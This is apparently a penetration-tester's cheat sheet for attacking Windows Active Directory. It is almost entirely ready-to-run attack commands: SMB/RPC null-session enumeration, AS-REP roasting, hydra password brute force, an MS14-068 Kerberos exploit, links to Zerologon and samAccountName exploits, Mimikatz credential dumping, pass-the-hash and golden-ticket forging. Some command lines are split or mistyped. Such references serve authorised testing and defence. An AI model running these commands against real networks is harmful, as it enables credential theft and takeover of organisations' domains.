An Active Directory environment has a very critical dependency on a Domain Name System (DNS) service. 

A typical domain controller in an AD will also host a DNS server that is authoritative for a given domain.

An attack against Active Directory infrastructure begins with an exploit or client-side attack against a domain workstation or server followed by enumeration of the AD environment.

##### Main concepts of Active Directory:

- Directory – Contains all the information about the objects of the Active directory
- Object – An object references almost anything inside the directory (a user, group, shared folder...)
- Domain – The objects of the directory are contained inside the domain. Inside a "forest" more than one domain can exist and each of them will have their own objects collection. 
- Tree – Group of domains with the same root. Example: dom.local, email.dom.local, www.dom.local
- Forest – The forest is the highest level of the organization hierarchy and is composed by a group of trees. The trees are connected by trust relationships.

##### Network scan
```
nmap -script='broadcast-dhcp-discover'
Nbtscan $subnet
```

##### DNS scan
```
Dig -t SRV _gc._tcp.<domain fqdn>

Dig -t SRV _ldap._tcp.<domain fqdn>

Dig -t SRV _kerberos._tcp.<domain fqdn>

Dig -t SRV _kpasswd._tcp.<endpoint fqdn>

­nmap —script dns-srv-enum –script-args “dns-srv-enum.domain=’<domain fqdn>’”

nmap -sT -Pn -n --open -p389 -script='ldap-rootdse'
```

#### enum4linux
```
enum4linux -all $IP
```



##### start off testing null authentication with smbclient, smbmap, rpcclient

looking to foothold, find shares, grab user and group information

```
smbclient -U "" -L \\\\$IP
smbmap -u "" -H $IP
rpcclient -U "" -N $IP
GetADUsers.py -all -dc-ip $IP domain.local/username
```

with user list - GetNPUsers.py
```
sudo python GetNPUsers.py domain.local/ -dc-ip $IP -request -usersfile /home/users.txt
```

with creds - SMB & Evil-WinRM
```
evil-winrm -u username -p password -i $IP
```

bruteforce with hydra
```
hydra -L /home/users.txt -p password smb://$IP
```

##### Kerberos Vulnerability in MS14-068

##### PyKEK (Python Kerberos Exploitation Kit)
[MS14-068](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek)
```
python ms14-068.py -u user-a-1@dom-a.loc -s S-1-5-21-557603841-771695929-1514560438-1103 -d dc-a-2003.dom-a.loc
Password: 
```

##### CVE-2020-1472 | Netlogon / Zerologin Elevation of Privilege Vulnerability / samAccountName Spoofing (CVE-2021–42278) & Domain Controller Impersonation (CVE-2021–42287)
```
https://github.com/WazeHell/sam-the-admin
https://github.com/dirkjanm/CVE-2020-1472
```

#### After foothold
```
net accounts
net user
net user /domain
net user $user_name /domain
net group /domain
whoami /user

# current domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# domain trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# current forest info
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

# get forest trust relationships
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()

# get DCs of a domain
nltest /dclist:offense.local
net group "domain controllers" /domain

# get DC for currently authenticated session
nltest /dsgetdc:offense.local

# get domain trusts from cmd shell
nltest /domain_trusts

# get user info
nltest /user:"spotless"

# get DC for currently authenticated session
set l

# get domain name and DC the user authenticated to
klist

# get all logon sessions. Includes NTLM authenticated sessions
klist sessions

# kerberos tickets for the session
klist

# cached krbtgt
klist tgt

# find DFS shares with ADModule
Get-ADObject -filter * -SearchBase "CN=Dfs-Configuration,CN=System,DC=offense,DC=local" | select name

# find DFS shares with ADSI
$s=[adsisearcher]'(name=*)'; $s.SearchRoot = [adsi]"LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local"; $s.FindAll() | % {$_.properties.name}

# check if spooler service is running on a host
powershell ls "\\dc01\pipe\spoolss"
```


##### Mimikatz
```
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
kerberos::list /export
sekurlsa::logonpasswords
sekurlsa::pth /user:$user_name /domain:corporate.com / ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-10a20000-
user@Domain_Server.corp.com-CORP.COM.kirbi

kerberos::purge
kerberos::list
kerberos::golden /user:$user_name /domain:corporate.com /sid:S-1-5-21-1602875587-
2787523311-2599479668 /target:CorpServer.corporate.com /service:HTTP
/rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
#rc4 = iis_service_account:password_hash
```

##### Pass the hash
```
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3bf05c425e //$IP cmd
```

##### Other resources

[PayloadsAllTheThings - AD Attack](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
[OverPass The Hash – Gentilkiwi Blog](https://blog.gentilkiwi.com/securite/mimikatz/overpass-the-hash)
[Pass The Ticket – Gentilkiwi Blog](https://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos)
[Golden Ticket – Gentilkiwi Blog](https://blog.gentilkiwi.com/securite/mimikatz/golden-ticket-kerberos)
[Mimikatz Golden Ticket Walkthrough](https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html)
